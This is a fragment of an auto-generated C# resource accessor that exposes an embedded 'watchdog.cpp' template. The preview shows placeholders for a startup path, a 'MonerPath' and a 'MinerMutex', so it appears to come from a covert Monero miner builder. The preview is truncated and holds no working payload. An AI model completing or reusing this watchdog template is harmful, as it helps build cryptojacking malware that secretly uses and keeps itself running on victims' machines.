        ///#define MAX_LENGTH 500
        ///
        ///
        ///int main (){
        ///
        ///    std::string StartUpBasePath = getenv(&quot;$StartUpBasePath&quot;);
        ///
        ///
        ///    std::string startupPath = &quot;$startupPath&quot;;
        ///    std::string MonerPath = &quot;$MonerPath&quot;;
        ///    std::string MonerMutex = &quot;$MinerMutex&quot;;
        ///    std::string xmMutex = &quot;DDRTHyper&quot;;
        /// [rest of string was truncated]&quot;;.
        /// </summary>
        public static string watchdog_cpp {
            get {
                return ResourceManager.GetString("watchdog.cpp", resourceCulture);
            }
        }
    }
}